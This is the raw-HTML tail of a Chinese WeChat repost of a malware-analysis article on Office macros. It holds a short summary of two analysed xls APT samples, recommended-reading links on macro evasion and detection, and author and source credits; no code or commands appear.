data-darkmode-bgimage-15933958453571="1" data-darkmode-color="rgba(0,0,0,0.9)" data-darkmode-color-15933958453571="#191919" data-style="width: 86px; height: 23px; background-image: url(&quot;https://static.xmt.cn/img/ec4f9c340d6648ebb9385fcca42ef031.png&quot;); background-size: contain; background-position: center center; transform: translateY(1px); visibility: visible;" style="width: 86px;height: 23px;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibYZxF5sDDy61MDtK7nbwTahMyvSouIRiatmGTy0TycPWfiay94QAfdia1g/640?wx_fmt=png&quot;);background-size: contain;background-position: center center;transform: translateY(1px);visibility: visible;max-width: 100%;"><br data-darkmode-bgimage-15933958453571="1" data-darkmode-color-15933958453571="#191919" style="visibility: visible;" data-darkmode-bgimage="1" data-darkmode-color="rgba(0,0,0,0.9)"  /><br style="display:none;"  /></section><section style="display: flex;align-items: flex-end;font-size:16px;line-height:36px;;color: rgb(182, 0, 0);letter-spacing: 1.78px;text-align: center;line-height: 22px;font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif;margin: 0px 12px;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-style="display: flex; align-items: flex-end; font-size:16px;line-height:36px;; color: rgb(182, 0, 0); letter-spacing: 1.78px; text-align: center; line-height: 22px; font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif; margin: 0px 12px; visibility: visible;" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)"><section style="min-width: 16px;white-space: nowrap;font-weight: 700;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)">0x04 总结</section></section></section><section style="height: 1px;background-image: linear-gradient(45deg, white, rgb(199, 13, 34) 10%, rgb(199, 13, 34) 90%, white 100%);visibility: visible;max-width: 100%;" data-darkmode-bgcolor-15933958453571="rgb(213, 74, 89)" data-darkmode-original-bgcolor-15933958453571="rgb(213, 74, 89)" data-style="height: 1px; background-image: linear-gradient(45deg, white, rgb(199, 13, 34) 10%, rgb(199, 13, 34) 90%, white 100%); visibility: visible;" data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255,255,255)"><br  /></section></section></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">在本小节中，我们对office恶意宏代码有了概要的了解并且通过两个简单的apt样本进行了分析，我们可以看到，宏代码在实际攻击中使用是非常广泛的，因为宏代码嵌入在文档中，是最容易和用户进行交互的部分，也往往是攻击者攻击中的第一部分。在本小节中我们分析了两个xls文档的宏代码，在下一小节我们将对带有混淆和反调试的宏代码进行调试和分析。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.3802083333333333" data-type="png" data-w="576" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/52_pWUOJXO3QMrMmAMdDicMa4kPHzTjsQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibp0sIGiamES9ichGfM3rmCKNCDYLpWUOJXO3QMrMmAMdDicMa4kPHzTjsQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); color: rgb(163, 163, 163) !important;" class="js_darkmode__79" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/53_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible !important;width: 640px !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__80" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__81" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(0, 0, 0)" data-style="color: rgb(0, 0, 0);" class="js_darkmode__82" style="max-width: 100%;color: rgb(0, 0, 0);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(0, 0, 0)" style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">推荐阅读：</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__83" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247492416&amp;idx=1&amp;sn=c444b28f7aa67e9ee15d42bc1aeef10d&amp;chksm=ec1cb67fdb6b3f69d33753fd68cad86f401c07f5fddb3157c81468cab144978a5fb3840da037&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>Office如何快速进行宏免杀</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487401&amp;idx=1&amp;sn=55821cd34f91e44b5b95934878f8430b&amp;chksm=ec1f5a96db68d3807e3dc359870e30ef68cdca47ba206b3d7788d91ec57b98576586e99f5bea&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>利用DOCX文档远程模板注入执行宏</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MjM5NTE0MjQyMg==&amp;mid=2650463354&amp;idx=2&amp;sn=cb6fc9942d10d898096e20b2e112677c&amp;scene=21#wechat_redirect" tab="innerlink" data-linktype="2"><strong>常见绕过office文件检测的恶意样本研究</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__85" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzA5MjkzNDk0MQ==&amp;mid=2652945546&amp;idx=2&amp;sn=27724b67b6c5da81e50a0deb019ef87b&amp;scene=21#wechat_redirect" tab="innerlink" data-linktype="2"><strong>浅析Office恶意宏代码如何隐藏和破解</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__95" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163) !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"  /></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247492986&amp;idx=1&amp;sn=cc287bb57eb878e02a7242f04510eccf&amp;chksm=ec1cb045db6b3953fe1ebacd9290870ce5ff5d47ccbf5008a5c7c14f1cb99776e55023de4d74&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" hasload="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="max-width: 100%;line-height: 0;box-sizing: border-box !important;overflow-wrap: break-word !important;"><img class="rich_pages" data-backh="221" data-backw="520" data-ratio="0.4255555555555556" data-s="300,640" data-type="png" data-w="900" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/54_oDxIic2QaZYKKrLDlJFT5v6EpREmjg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou80h6Jor7Py4sKIwfiaowozsMP0Yjn9RcoJAmPMKa5hQVczeXoDxIic2QaZYKKrLDlJFT5v6EpREmjg/640?wx_fmt=png'" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 53px;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible !important;width: 677px !important;"  /></span></a></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"  /></p><p style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(255, 104, 39);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__99" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: right;"><span style="font-size:12px;line-height:32px;;">文章来源：安全客</span><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__99" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: right;"><span style="font-size:12px;line-height:32px;;">作者：想吃肚包鸡</span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__100" data-darkmode-bgcolor-16097307634841="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16097307634841="rgb(255, 255, 255)" data-darkmode-color-16097307634841="rgb(163, 163, 163)" data-darkmode-original-color-16097307634841="rgb(163, 163, 163)" style="max-width: 100%;min-height: 1em;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/55_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible !important;width: 677px !important;"  /></p>
                <div class="msg_source_url"><a href="https://www.anquanke.com/post/id/209321">阅读原文</a></div></div>
</div>
</body>
</html>